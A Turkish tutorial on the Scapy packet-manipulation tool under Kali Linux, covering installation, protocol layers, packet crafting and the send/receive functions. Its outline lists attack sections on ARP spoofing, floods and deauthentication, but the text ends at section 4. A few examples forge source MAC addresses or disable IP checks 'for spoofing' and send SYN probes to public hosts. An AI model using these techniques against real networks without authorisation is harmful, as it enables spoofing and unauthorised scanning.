# Scapy ile Ağların Derinliklerine Yolculuk

![Scapy Logo](scapy.jpg) <!-- Resmi Scapy logosunu veya uygun bir görseli buraya ekleyebilirsiniz -->

Bu rehber, Python tabanlı güçlü paket manipülasyon aracı Scapy'yi Kali Linux üzerinde kullanarak, ağ paketlerini nasıl oluşturacağınızı, göndereceğinizi, yakalayacağınızı, analiz edeceğinizi ve çeşitli ağ senaryolarını nasıl uygulayacağınızı sıfırdan ileri seviyeye kadar öğretmeyi amaçlamaktadır.

---

**İçindekiler**

1.  [Giriş](#1-giriş)
    *   [Scapy Nedir?](#scapy-nedir)
    *   [Neden Scapy? Avantajları Nelerdir?](#neden-scapy-avantajları-nelerdir)
    *   [Bu Rehber Kimler İçin?](#bu-rehber-kimler-i̇çin)
    *   [Ön Gereksinimler](#ön-gereksinimler)
2.  [Kurulum ve Ortam Hazırlığı](#2-kurulum-ve-ortam-hazırlığı)
    *   [Kali Linux'ta Scapy](#kali-linuxta-scapy)
    *   [Scapy'yi Başlatma ve Temel Etkileşim](#scapyyi-başlatma-ve-temel-etkileşim)
    *   [Temel Scapy Komutları (`ls`, `lsc`, `help`, `conf`)](#temel-scapy-komutları)
3.  [Scapy'nin Yapı Taşları: Paketler ve Katmanlar](#3-scapynin-yapı-taşları-paketler-ve-katmanlar)
    *   [Ağ Katmanlarına Genel Bakış (OSI ve TCP/IP)](#ağ-katmanlarına-genel-bakış)
    *   [Scapy'de Katmanlar (Layers)](#scapyde-katmanlar-layers)
        *   [Ethernet (`Ether`)](#ethernet-ether)
        *   [IP (`IP`, `IPv6`)](#ip-ip-ipv6)
        *   [TCP (`TCP`)](#tcp-tcp)
        *   [UDP (`UDP`)](#udp-udp)
        *   [ICMP (`ICMP`)](#icmp-icmp)
        *   [ARP (`ARP`)](#arp-arp)
        *   [DNS (`DNS`)](#dns-dns)
        *   [Diğer Önemli Katmanlar](#diğer-önemli-katmanlar)
    *   [Paket Oluşturma (Crafting)](#paket-oluşturma-crafting)
    *   [Paket Alanlarını (Fields) Görüntüleme ve Değiştirme](#paket-alanlarını-fields-görüntüleme-ve-değiştirme)
    *   [Paket Özetleri (`summary`, `nsummary`)](#paket-özetleri-summary-nsummary)
    *   [Ham Veri (Raw Payload) Eklemek](#ham-veri-raw-payload-eklemek)
4.  [Paket Gönderme ve Alma İşlemleri](#4-paket-gönderme-ve-alma-i̇şlemleri)
    *   [Katman 3'te Paket Gönderme: `send()`](#katman-3te-paket-gönderme-send)
    *   [Katman 2'de Paket Gönderme: `sendp()`](#katman-2de-paket-gönderme-sendp)
    *   [Cevap Bekleyerek Paket Gönderme (Tek Cevap): `sr1()`, `srp1()`](#cevap-bekleyerek-paket-gönderme-tek-cevap-sr1-srp1)
    *   [Cevap Bekleyerek Paket Gönderme (Çoklu Cevap): `sr()`, `srp()`](#cevap-bekleyerek-paket-gönderme-çoklu-cevap-sr-srp)
    *   [Gönderim Parametreleri (`iface`, `timeout`, `verbose`, `loop`, `inter`)](#gönderim-parametreleri)
    *   [Cevap Paketlerini Anlamak ve İşlemek](#cevap-paketlerini-anlamak-ve-i̇şlemek)
5.  [Ağ Trafiğini Dinleme (Sniffing)](#5-ağ-trafiğini-dinleme-sniffing)
    *   [`sniff()` Fonksiyonu ve Temel Kullanımı](#sniff-fonksiyonu-ve-temel-kullanımı)
    *   [Filtreleme: BPF (Berkeley Packet Filter)](#filtreleme-bpf-berkeley-packet-filter)
    *   [`prn` ve `lfilter` ile Anlık Paket İşleme](#prn-ve-lfilter-ile-anlık-paket-i̇şleme)
    *   [Paketleri Saklama (`store`) ve Sayı Sınırlama (`count`)](#paketleri-saklama-store-ve-sayı-sınırlama-count)
    *   [Dinleme Süresini Ayarlama (`timeout`, `stop_filter`)](#dinleme-süresini-ayarlama-timeout-stop_filter)
    *   [Yakalanan Paketlerle Çalışmak (`PacketList`)](#yakalanan-paketlerle-çalışmak-packetlist)
    *   [Paketleri Dosyaya Yazma (`wrpcap`) ve Okuma (`rdpcap`)](#paketleri-dosyaya-yazma-wrpcap-ve-okuma-rdpcap)
6.  [Temel Ağ Senaryoları ve Keşif Teknikleri](#6-temel-ağ-senaryoları-ve-keşif-teknikleri)
    *   [ARP Ping (Yerel Ağ Keşfi)](#arp-ping-yerel-ağ-keşfi)
    *   [ICMP Ping (Host Keşfi)](#icmp-ping-host-keşfi)
    *   [ICMP Ping Sweep (Ağ Tarama)](#icmp-ping-sweep-ağ-tarama)
    *   [TCP Port Tarama](#tcp-port-tarama)
        *   [TCP SYN Scan (Stealth Scan)](#tcp-syn-scan-stealth-scan)
        *   [TCP Connect Scan](#tcp-connect-scan)
        *   [TCP ACK Scan (Firewall Tespiti)](#tcp-ack-scan-firewall-tespiti)
        *   [TCP FIN, Null, Xmas Scan](#tcp-fin-null-xmas-scan)
    *   [UDP Port Tarama](#udp-port-tarama)
    *   [İşletim Sistemi Tespiti (OS Fingerprinting - Temel Yaklaşımlar)](#i̇şletim-sistemi-tespiti-os-fingerprinting---temel-yaklaşımlar)
    *   [Traceroute Uygulaması](#traceroute-uygulaması)
7.  [Ağ Saldırıları ve Savunma Testleri (Etik Çerçevede)](#7-ağ-saldırıları-ve-savunma-testleri-etik-çerçevede)
    *   **UYARI: Sadece İzinli ve Kontrollü Ortamlarda Deneyin!**
    *   [ARP Spoofing (Man-in-the-Middle Saldırısı)](#arp-spoofing-man-in-the-middle-saldırısı)
    *   [DNS Spoofing (Temel Düzey)](#dns-spoofing-temel-düzey)
    *   [SYN Flood (DoS Saldırısı Simülasyonu)](#syn-flood-dos-saldırısı-simülasyonu)
    *   [ICMP Flood](#icmp-flood)
    *   [LAND Attack](#land-attack)
    *   [TCP Session Hijacking (Temel Konseptler)](#tcp-session-hijacking-temel-konseptler)
8.  [Kablosuz Ağlarla (802.11) Çalışmak](#8-kablosuz-ağlarla-80211-çalışmak)
    *   [Monitör Moduna Geçiş (Kali Linux'ta `airmon-ng`)](#monitör-moduna-geçiş-kali-linuxta-airmon-ng)
    *   [802.11 Katmanları (`Dot11`, `Dot11Beacon`, `Dot11ProbeReq` vb.)](#80211-katmanları-dot11-dot11beacon-dot11probereq-vb)
    *   [Beacon Çerçevelerini Yakalama ve Analiz Etme](#beacon-çerçevelerini-yakalama-ve-analiz-etme)
    *   [Probe Request/Response Paketlerini İnceleme](#probe-requestresponse-paketlerini-i̇nceleme)
    *   [Deauthentication/Disassociation Saldırısı (Etik Uyarılarla!)](#deauthenticationdisassociation-saldırısı-etik-uyarılarla)
    *   [Kablosuz Trafik Enjeksiyonu](#kablosuz-trafik-enjeksiyonu)
9.  [Protokol Analizi ve Sorun Giderme](#9-protokol-analizi-ve-sorun-giderme)
    *   [DHCP Protokol Akışını İzleme (DORA)](#dhcp-protokol-akışını-i̇zleme-dora)
    *   [DNS Sorgu ve Cevaplarını Detaylı İnceleme](#dns-sorgu-ve-cevaplarını-detaylı-i̇nceleme)
    *   [HTTP Trafiğini Yakalama ve Basit Analiz](#http-trafiğini-yakalama-ve-basit-analiz)
    *   [TCP Üçlü El Sıkışma (Three-Way Handshake) ve Kapanış Analizi](#tcp-üçlü-el-sıkışma-three-way-handshake-ve-kapanış-analizi)
10. [Scapy ile Python Scriptleri Geliştirmek](#10-scapy-ile-python-scriptleri-geliştirmek)
    *   [Scapy'yi Python Scriptine Dahil Etmek](#scapyyi-python-scriptine-dahil-etmek)
    *   [Fonksiyonlar ve Döngülerle Otomasyon](#fonksiyonlar-ve-döngülerle-otomasyon)
    *   [Argüman İşleme (`sys.argv`, `argparse`)](#argüman-i̇şleme-sysargv-argparse)
    *   [Örnek Otomasyon Scriptleri](#örnek-otomasyon-scriptleri)
        *   [Gelişmiş Port Tarayıcı](#gelişmiş-port-tarayıcı)
        *   [Ağ Keşif Aracı](#ağ-keşif-aracı)
        *   [Özelleştirilmiş Paket Üreteci](#özelleştirilmiş-paket-üreteci)
11. [İleri Seviye Scapy Teknikleri](#11-i̇leri-seviye-scapy-teknikleri)
    *   [Kendi Protokol Katmanlarınızı Tanımlama](#kendi-protokol-katmanlarınızı-tanımlama)
    *   [Scapy ve Diğer Araçlar (Wireshark, Nmap Entegrasyonu)](#scapy-ve-diğer-araçlar-wireshark-nmap-entegrasyonu)
    *   [Scapy'de Asenkron İşlemler](#scapyde-asenkron-i̇şlemler)
    *   [Görselleştirme (`plot`, `pdfdump`, `psdump`)](#görselleştirme-plot-pdfdump-psdump)
    *   [Performans Optimizasyonu ve İpuçları](#performans-optimizasyonu-ve-i̇puçları)
    *   [Scapy Yapılandırmasını Özelleştirme (`conf`)](#scapy-yapılandırmasını-özelleştirme-conf)
12. [Yaygın Sorunlar ve Çözümleri](#12-yaygın-sorunlar-ve-çözümleri)
13. [Güvenlik, Etik ve Yasal Hususlar](#13-güvenlik-etik-ve-yasal-hususlar)
14. [Sonuç ve Gelecek Adımlar](#14-sonuç-ve-gelecek-adımlar)
15. [Faydalı Kaynaklar ve Referanslar](#15-faydalı-kaynaklar-ve-referanslar)

---

## 1. Giriş

### Scapy Nedir?
Scapy, Python programlama diliyle yazılmış, güçlü ve etkileşimli bir paket manipülasyon programıdır. Ağ paketlerini oluşturmanıza (crafting/forging), çözmenize (decoding), göndermenize, yakalamanıza (sniffing) ve daha birçok karmaşık işlemi yapmanıza olanak tanır. Ağ trafiğiyle düşük seviyede çalışmak isteyenler için adeta bir İsviçre çakısıdır.

### Neden Scapy? Avantajları Nelerdir?
*   **Esneklik:** Neredeyse tüm ağ protokollerinde özel paketler oluşturabilirsiniz.
*   **Python Entegrasyonu:** Python'un tüm gücünü (kütüphaneler, veri yapıları, kontrol akışı) Scapy ile birleştirebilirsiniz.
*   **Etkileşimli Kabuk:** Hızlı denemeler ve keşifler için idealdir.
*   **Protokol Desteği:** Geniş bir protokol yelpazesini destekler ve kolayca genişletilebilir.
*   **Çok Yönlülük:** Birçok farklı aracın (hping, nmap'in bazı özellikleri, arpspoof, tcpdump) yaptığı işleri tek bir araçla yapabilme imkanı sunar.
*   **Öğrenme Aracı:** Ağ protokollerinin nasıl çalıştığını anlamak için mükemmeldir.

### Bu Rehber Kimler İçin?
*   Sızma Testi Uzmanları (Penetration Testers)
*   Ağ Güvenliği Analistleri ve Araştırmacıları
*   Ağ Mühendisleri ve Yöneticileri
*   Siber Güvenlik Öğrencileri ve Meraklıları
*   Protokol Geliştiricileri
*   Kısacası, ağların derinliklerine inmek isteyen herkes!

### Ön Gereksinimler
*   Temel Linux komut satırı bilgisi.
*   Temel ağ kavramları (IP adresi, MAC adresi, Portlar, TCP/IP modeli, DNS, DHCP vb.).
*   Temel Python programlama bilgisi (özellikle script yazma bölümleri için faydalı olacaktır, ancak interaktif kabuk kullanımı için şart değildir).
*   **Kali Linux** kurulu bir sanal makine veya fiziksel sistem (Bu rehber Kali Linux odaklıdır).

---

## 2. Kurulum ve Ortam Hazırlığı

### Kali Linux'ta Scapy
Kali Linux, sızma testi ve dijital adli bilişim için özel olarak tasarlanmış bir dağıtımdır ve Scapy genellikle **önceden yüklenmiş** olarak gelir.

Eğer kurulu değilse veya en son sürümü yüklemek isterseniz:
```bash
sudo apt update
sudo apt install python3-scapy # Veya sadece scapy
```
Veya pip ile:
```bash
pip3 install --pre scapy[complete] # Tüm bağımlılıklarla yükler
```

### Scapy'yi Başlatma ve Temel Etkileşim
Scapy'yi genellikle root yetkileriyle çalıştırmak, ham soketlere erişim gibi özellikler için gereklidir.

Kali terminalini açın ve Scapy'yi başlatın:
```bash
sudo scapy
```
Karşınıza `>>>` şeklinde bir Scapy komut istemi (REPL - Read-Eval-Print Loop) gelecektir. Artık Scapy komutlarını girmeye hazırsınız.

Çıkmak için:
```python
>>> exit()
```

### Temel Scapy Komutları
Scapy kabuğunda kullanabileceğiniz bazı temel komutlar:

*   **`ls()`**: Desteklenen tüm protokol katmanlarını listeler.
    ```python
    >>> ls()
    ARP        : ARP
    BOOTP      : BOOTP
    DHCP       : DHCP options
    DNS        : DNS
    DNSQR      : DNS Question Record
    DNSRR      : DNS Resource Record
    Dot11      : IEEE 802.11
    ... (ve daha fazlası)
    ```
*   **`ls(ProtokolAdı)`**: Belirli bir protokol katmanının alanlarını (fields) listeler.
    ```python
    >>> ls(IP)
    version    : BitField             = (4)
    ihl        : BitField             = (None)
    tos        : XByteField           = (0)
    len        : ShortField           = (None)
    id         : ShortField           = (1)
    flags      : FlagsField           = (0)
    frag       : BitField             = (0)
    ttl        : ByteField            = (64)
    proto      : ByteEnumField        = (0)
    chksum     : XShortField          = (None)
    src        : SourceIPField        = (None)
    dst        : DestIPField          = (None)
    options    : PacketListField      = ([])
    ```
*   **`lsc()`**: Mevcut Scapy komutlarını (fonksiyonlarını) listeler.
    ```python
    >>> lsc()
    IPID_count        : Identify IP id values classes.
    arpcache          : Content of the ARP cache
    arping            : Send ARP "who has" requests to determine which hosts are up
    bind_layers       : Bind 2 layers on some specific fields
    bridge_and_sniff  : Forward traffic between interfaces iface1 and iface2 and sniff data
    ... (ve daha fazlası)
    ```
*   **`help(komut_veya_katman)`**: Belirli bir komut veya katman hakkında detaylı yardım gösterir.
    ```python
    >>> help(TCP)
    >>> help(sniff)
    ```
*   **`conf`**: Scapy'nin genel yapılandırma ayarlarını görüntüler ve değiştirmenizi sağlar.
    ```python
    >>> conf.iface    # Varsayılan ağ arayüzünü gösterir (örn: 'eth0')
    'eth0'
    >>> conf.verb     # Ayrıntı seviyesi (0: sessiz, 1: normal, 2: ayrıntılı)
    2
    >>> conf.verb = 0 # Daha az çıktı için ayrıntı seviyesini düşür
    >>> conf.promisc = True # Arayüzü karışık (promiscuous) moda alır
    >>> conf.checkIPaddr = False # Kaynak IP adresini doğrulamayı kapat (spoofing için)
    ```

---

## 3. Scapy'nin Yapı Taşları: Paketler ve Katmanlar

### Ağ Katmanlarına Genel Bakış
Ağ iletişimi, genellikle OSI (Open Systems Interconnection) modeli veya TCP/IP modeli ile açıklanan katmanlı bir yapıya sahiptir. Scapy, bu katmanları nesneler olarak temsil ederek onlarla etkileşim kurmanızı sağlar.

*   **TCP/IP Modeli:**
    *   Uygulama Katmanı (HTTP, FTP, DNS, SMTP vb.)
    *   Taşıma Katmanı (TCP, UDP)
    *   İnternet Katmanı (IP, ICMP, ARP)
    *   Ağ Erişim/Bağlantı Katmanı (Ethernet, Wi-Fi)

### Scapy'de Katmanlar (Layers)
Scapy'de her ağ protokolü katmanı bir Python sınıfı ile temsil edilir. Bir paket oluştururken bu sınıfları örnekleriz.

#### Ethernet (`Ether`)
Yerel ağ iletişimi için temel katmandır. MAC adreslerini içerir.
```python
>>> from scapy.all import Ether
>>> eth_katmani = Ether()
>>> eth_katmani.show()
###[ Ethernet ]###
  dst       = ff:ff:ff:ff:ff:ff
  src       = 00:0c:29:xx:yy:zz  # Sizin MAC adresiniz
  type      = IPv4
```
*   `dst`: Hedef MAC adresi (varsayılan: broadcast `ff:ff:ff:ff:ff:ff`)
*   `src`: Kaynak MAC adresi (varsayılan: Scapy'nin çalıştığı arayüzün MAC'i)
*   `type`: Üst katman protokolü (örn: `IPv4`, `ARP`)

#### IP (`IP`, `IPv6`)
Ağlar arası yönlendirme için kullanılır. IP adreslerini içerir.
```python
>>> from scapy.all import IP
>>> ip_katmani = IP()
>>> ip_katmani.show()
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     =
  frag      = 0
  ttl       = 64
  proto     = hopopt
  chksum    = None
  src       = 127.0.0.1 # Veya arayüz IP'niz
  dst       = 127.0.0.1
  \options   \
```
*   `src`: Kaynak IP adresi
*   `dst`: Hedef IP adresi
*   `ttl`: Time To Live (Yaşam Süresi)
*   `proto`: Üst katman protokolü (örn: `tcp`, `udp`, `icmp`)
*   `id`: Paket tanımlayıcısı (fragmentasyon için)
*   `flags`: Fragmentasyon bayrakları (`DF` - Don't Fragment, `MF` - More Fragments)

IPv6 için `IPv6()` sınıfı kullanılır:
```python
>>> from scapy.all import IPv6
>>> ipv6_katmani = IPv6(dst="::1") # Loopback adresine
>>> ipv6_katmani.show()
```

#### TCP (`TCP`)
Güvenilir, bağlantı odaklı iletişim sağlar. Port numaralarını ve kontrol bayraklarını içerir.
```python
>>> from scapy.all import TCP
>>> tcp_katmani = TCP()
>>> tcp_katmani.show()
###[ TCP ]###
  sport     = ftp_data
  dport     = http
  seq       = 0
  ack       = 0
  dataofs   = None
  reserved  = 0
  flags     = S  # Varsayılan olarak SYN bayrağı
  window    = 8192
  chksum    = None
  urgptr    = 0
  options   = []
```
*   `sport`: Kaynak port
*   `dport`: Hedef port
*   `seq`: Sequence numarası
*   `ack`: Acknowledgment numarası
*   `flags`: TCP bayrakları:
    *   `S` (SYN - Synchronize)
    *   `A` (ACK - Acknowledge)
    *   `F` (FIN - Finish)
    *   `R` (RST - Reset)
    *   `P` (PSH - Push)
    *   `U` (URG - Urgent)
    *   Örnek: `flags="SA"` (SYN-ACK)

#### UDP (`UDP`)
Güvenilmez, bağlantısız iletişim sağlar. Daha az başlık bilgisi içerir, daha hızlıdır.
```python
>>> from scapy.all import UDP
>>> udp_katmani = UDP()
>>> udp_katmani.show()
###[ UDP ]###
  sport     = domain
  dport     = domain
  len       = None
  chksum    = None
```
*   `sport`: Kaynak port
*   `dport`: Hedef port

#### ICMP (`ICMP`)
Hata raporlama ve ağ tanılama için kullanılır (örn: ping).
```python
>>> from scapy.all import ICMP
>>> icmp_katmani = ICMP()
>>> icmp_katmani.show()
###[ ICMP ]###
  type      = echo-request # Varsayılan olarak Ping isteği
  code      = 0
  chksum    = None
  id        = 0x0
  seq       = 0x0
```
*   `type` ve `code`: ICMP mesajının türünü ve alt türünü belirtir.
    *   `type=8, code=0`: Echo request (Ping isteği)
    *   `type=0, code=0`: Echo reply (Ping cevabı)
    *   `type=3, code=3`: Destination port unreachable

#### ARP (`ARP`)
Yerel ağda IP adreslerini MAC adreslerine çözümler.
```python
>>> from scapy.all import ARP
>>> arp_katmani = ARP()
>>> arp_katmani.show()
###[ ARP ]###
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = 6
  plen      = 4
  op        = who-has # Varsayılan olarak ARP request
  hwsrc     = 00:0c:29:xx:yy:zz
  psrc      = 192.168.1.101 # Sizin IP'niz
  hwdst     = 00:00:00:00:00:00
  pdst      = 0.0.0.0
```
*   `op`: Operasyon kodu (1: request, 2: reply)
*   `psrc`: Gönderenin IP adresi
*   `pdst`: Hedeflenen IP adresi
*   `hwsrc`: Gönderenin MAC adresi
*   `hwdst`: Hedeflenen MAC adresi (request'te genellikle `00:00:00:00:00:00`)

#### DNS (`DNS`)
Alan adlarını IP adreslerine çözümler.
```python
>>> from scapy.all import DNS, DNSQR
>>> dns_katmani = DNS()
>>> dns_katmani.qd = DNSQR(qname="google.com") # Query Domain, Question Record
>>> dns_katmani.show()
###[ DNS ]###
  id        = 0
  qr        = 0
  opcode    = QUERY
  aa        = 0
  tc        = 0
  rd        = 1 # Recursion Desired (özyineleme isteniyor)
  ra        = 0
  z         = 0
  rcode     = ok
  qdcount   = 1
  ancount   = 0
  nscount   = 0
  arcount   = 0
  \qd        \
   |###[ DNS Question Record ]###
   |  qname     = 'google.com.'
   |  qtype     = A
   |  qclass    = IN
  an        = None
  ns        = None
  ar        = None
```
*   `qd`: Question bölümü (genellikle `DNSQR` nesnesi)
*   `an`: Answer bölümü (genellikle `DNSRR` nesnesi)
*   `rd`: Recursion Desired (Sunucudan özyinelemeli sorgu yapmasını ister)

#### Diğer Önemli Katmanlar
*   `Dot11`, `Dot11Beacon`, `Dot11ProbeReq`: 802.11 Wi-Fi paketleri.
*   `BOOTP`, `DHCP`: IP adresi atama protokolleri.
*   `HTTP`: (Scapy'de ayrı bir HTTP katmanı yoktur, `Raw` katmanı içinde metin olarak bulunur, ancak `scapy-http` gibi eklentilerle daha yapısal çalışılabilir.)

### Paket Oluşturma (Crafting)
Katmanları `/` operatörü ile birleştirerek paketler oluştururuz. En dıştaki katman en solda olur.
```python
>>> # Basit bir ICMP Ping paketi (IP başlığı ile)
>>> ping_paketi = IP(dst="8.8.8.8")/ICMP()
>>> ping_paketi.show()
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     =
  frag      = 0
  ttl       = 64
  proto     = icmp
  chksum    = None
  src       = 192.168.1.101 # Sizin IP'niz
  dst       = 8.8.8.8
  \options   \
###[ ICMP ]###
     type      = echo-request
     code      = 0
     chksum    = None
     id        = 0x0
     seq       = 0x0

>>> # Bir DNS sorgu paketi (Ethernet, IP, UDP, DNS)
>>> dns_sorgu = Ether()/IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="github.com"))
>>> dns_sorgu.show()
```
Scapy, siz belirtmediğinizde birçok alanı (kaynak IP/MAC, checksum, uzunluk vb.) otomatik olarak doldurur.

### Paket Alanlarını (Fields) Görüntüleme ve Değiştirme
Oluşturduğunuz bir paketin belirli bir katmanındaki alanlara erişebilir ve bunları değiştirebilirsiniz.

```python
>>> pkt = IP(dst="google.com")/TCP(dport=80, flags="S")

>>> # Alanları görüntüleme
>>> print(pkt[IP].dst)
google.com
>>> print(pkt[TCP].flags)
S (SYN)
>>> print(pkt[IP].ttl)
64

>>> # Alanları değiştirme
>>> pkt[IP].dst = "1.1.1.1"
>>> pkt[TCP].dport = 443
>>> pkt[IP].ttl = 128
>>> pkt[TCP].flags = "SA" # SYN-ACK

>>> pkt.show() # Değişiklikleri gör
```

Bazı alanlar için isimler yerine sayısal değerler de kullanabilirsiniz:
```python
>>> pkt[IP].proto # 'tcp' (6), 'udp' (17), 'icmp' (1)
6
>>> pkt[IP].proto = 17 # UDP olarak değiştir
>>> pkt.show() # Artık proto=udp
```

### Paket Özetleri (`summary`, `nsummary`)
*   **`.summary()`**: Paketin okunabilir bir özetini verir.
    ```python
    >>> ping_paketi.summary()
    'IP / ICMP 192.168.1.101 > 8.8.8.8 echo-request 0'
    ```
*   **`.nsummary()`**: `summary()`'nin daha kısa bir versiyonu, genellikle paket listelerinde kullanılır.
    ```python
    >>> dns_sorgu.nsummary()
    'Ether / IP / UDP / DNS Ans Coherency qd=github.com.'
    ```
*   **`str(paket)`**: Paketin byte dizisi (binary string) halini verir.
    ```python
    >>> str(ping_paketi)
    b'E\x00\x00\x1c\x00\x01\x00\x00@\x01<\xc5\xc0\xa8\x01e\x08\x08\x08\x08\x08\x00o\xf9\x00\x00\x00\x00'
    ```
*   **`hexdump(paket)`**: Paketin hexadecimal dökümünü gösterir.
    ```python
    >>> hexdump(ping_paketi)
    0000  45 00 00 1C 00 01 00 00 40 01 3C C5 C0 A8 01 65  E.......@.<....e
    0010  08 08 08 08 08 00 6F F9 00 00 00 00              ......o.....
    ```

### Ham Veri (Raw Payload) Eklemek
Bir pakete uygulama katmanı verisi (payload) eklemek için genellikle `Raw` katmanı kullanılır veya doğrudan en içteki katmana `/` ile bir string eklenebilir.

```python
>>> from scapy.all import Raw
>>> http_get_istegi = IP(dst="example.com")/TCP(dport=80)/Raw(load="GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
# VEYA
>>> http_get_istegi_alternatif = IP(dst="example.com")/TCP(dport=80)/"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"

>>> http_get_istegi.show()
###[ IP ]###
  version   = 4
  ihl       = None
  tos       = 0x0
  len       = None
  id        = 1
  flags     =
  frag      = 0
  ttl       = 64
  proto     = tcp
  chksum    = None
  src       = 192.168.1.101
  dst       = example.com
  \options   \
###[ TCP ]###
     sport     = ftp_data
     dport     = http
     seq       = 0
     ack       = 0
     dataofs   = None
     reserved  = 0
     flags     = S
     window    = 8192
     chksum    = None
     urgptr    = 0
     options   = []
###[ Raw ]###
        load      = 'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'

>>> print(http_get_istegi[Raw].load)
b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'
```

---

## 4. Paket Gönderme ve Alma İşlemleri

Scapy, oluşturduğunuz paketleri ağa göndermek ve cevapları almak için çeşitli fonksiyonlar sunar.

### Katman 3'te Paket Gönderme: `send()`
`send(paket_ler, ...)`: Paketleri Katman 3 (IP seviyesi) üzerinden gönderir.
*   Scapy, hedef IP adresine ulaşmak için sistemin yönlendirme tablosunu kullanır ve uygun Ethernet başlığını (MAC adresleri) otomatik olarak ekler.
*   Cevap beklemez. "Gönder ve unut" prensibiyle çalışır.
*   Tek bir paket veya bir paket listesi gönderebilir.

```python
>>> from scapy.all import IP, ICMP, send
>>> paket1 = IP(dst="8.8.8.8")/ICMP()
>>> paket2 = IP(dst="1.1.1.1")/ICMP()
>>> send(paket1)
.
Sent 1 packets.
>>> send([paket1, paket2], count=3, inter=1) # Her paketi 3 kez, 1 saniye arayla gönder
...
Sent 6 packets.
```

### Katman 2'de Paket Gönderme: `sendp()`
`sendp(paket_ler, ...)`: Paketleri Katman 2 (Ethernet seviyesi) üzerinden gönderir.
*   Bu fonksiyonu kullanırken paketin en dış katmanı `Ether` olmalıdır (yani MAC adreslerini siz belirtmelisiniz).
*   Yönlendirme tablosu kullanılmaz. Doğrudan belirtilen ağ arayüzünden gönderilir.
*   ARP paketleri, yerel ağda özel MAC adreslerine paket gönderme gibi durumlar için idealdir.
*   Cevap beklemez.

```python
>>> from scapy.all import Ether, ARP, IP, UDP, sendp
>>> # Yerel ağdaki bir IP'ye ARP isteği (Ethernet başlığıyla)
>>> arp_istek = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1")
>>> sendp(arp_istek, iface="eth0") # eth0 yerine kendi arayüzünüzü yazın
.
Sent 1 packets.

>>> # Belirli bir MAC adresine IP/UDP paketi gönderme (spoofing için kullanılabilir)
>>> ozel_paket = Ether(src="AA:BB:CC:DD:EE:FF", dst="11:22:33:44:55:66")/IP(dst="192.168.1.50")/UDP(dport=12345)
>>> sendp(ozel_paket, iface="eth0")
.
Sent 1 packets.
```
**Not:** `sendp` ve `srp` ailesi genellikle root yetkisi gerektirir.

### Cevap Bekleyerek Paket Gönderme (Tek Cevap): `sr1()`, `srp1()`
Bu fonksiyonlar paket gönderir ve **sadece ilk gelen cevabı** alır. Timeout süresi içinde cevap gelmezse `None` dönerler.

*   **`sr1(paket, ...)`**: Katman 3'te gönderir ve cevap bekler.
    ```python
    >>> from scapy.all import IP, ICMP, sr1
    >>> cevap = sr1(IP(dst="google.com")/ICMP(), timeout=2, verbose=0) # verbose=0 daha az çıktı
    >>> if cevap:
    ...     print("Cevap alındı:")
    ...     cevap.show()
    ... else:
    ...     print("Cevap alınamadı (timeout).")
    ...
    Cevap alındı:
    ###[ IP ]###
    ... (Google'dan gelen ICMP reply)
    ```

*   **`srp1(paket, ...)`**: Katman 2'de gönderir ve cevap bekler (paket `Ether` ile başlamalı).
    ```python
    >>> from scapy.all import Ether, ARP, srp1
    >>> cevap_arp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1"), timeout=1, iface="eth0", verbose=0)
    >>> if cevap_arp:
    ...     print(f"IP: {cevap_arp.psrc} -> MAC: {cevap_arp.hwsrc}")
    ...     cevap_arp.show()
    ...
    IP: 192.168.1.1 -> MAC: ab:cd:ef:12:34:56
    ###[ Ethernet ]###
    ...
    ```

### Cevap Bekleyerek Paket Gönderme (Çoklu Cevap): `sr()`, `srp()`
Bu fonksiyonlar paket gönderir ve gelen **tüm cevapları** yakalar. Bir tuple döndürürler: `(cevap_gelenler, cevap_gelmeyenler)`. Her iki eleman da `SndRcvList` tipindedir.

*   **`sr(paket_ler, ...)`**: Katman 3'te gönderir.
    ```python
    >>> from scapy.all import IP, TCP, sr
    >>> # Google'ın 80 ve 443 portlarına SYN paketi gönder
    >>> ans, unans = sr(IP(dst="google.com")/TCP(dport=[80,443], flags="S"), timeout=1, verbose=0)
    >>> print("Cevap Gelenler:")
    >>> ans.summary()
    IP / TCP 172.217.169.14:https > 192.168.1.101:ftp_data SA / Padding
    IP / TCP 172.217.169.14:http > 192.168.1.101:ftp_data SA / Padding

    >>> print("\nCevap Gelmeyenler:")
    >>> unans.summary()
    # Eğer tüm paketlere cevap geldiyse burası boş olur.
    ```
    `ans` listesindeki her eleman bir tuple'dır: `(gonderilen_paket, alinan_cevap_paketi)`.
    ```python
    >>> for gonderilen, alinan in ans:
    ...     print(f"Gönderilen Port: {gonderilen[TCP].dport}, Alınan Cevap Bayrağı: {alinan[TCP].flags}")
    ...
    ```

*   **`srp(paket_ler, ...)`**: Katman 2'de gönderir.
    ```python
    >>> from scapy.all import Ether, ARP, srp
    >>> # Yerel ağdaki ilk 5 IP adresine ARP isteği
    >>> ans_arp_liste, unans_arp_liste = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1/30"), \
                                             timeout=2, iface="eth0", verbose=0)
    >>> print("ARP Cevapları:")
    >>> for gonderilen, alinan in ans_arp_liste:
    ...     print(f"IP: {alinan.psrc} \t MAC: {alinan.hwsrc}")
    ...
    ```

### Gönderim Parametreleri
Yukarıdaki gönderme fonksiyonları (`send`, `sendp`, `sr1`, `srp1`, `sr`, `srp`) bazı ortak parametreler alır:
*   **`iface`**: Paketlerin gönderileceği ağ arayüzü (örn: `"eth0"`, `"wlan0mon"`). `sendp` ve `srp` için genellikle zorunludur. `send` ve `sr` için Scapy yönlendirme tablosundan bulmaya çalışır, ancak belirtmek daha güvenilirdir.
*   **`timeout`**: Cevap bekleniyorsa (örn: `sr1`), cevap için beklenecek saniye cinsinden süre.
*   **`verbose`**: Çıktıların ayrıntı seviyesi. `conf.verb` ayarını geçersiz kılar. Genellikle `verbose=0` scriptlerde sessiz çalışma için kullanılır.
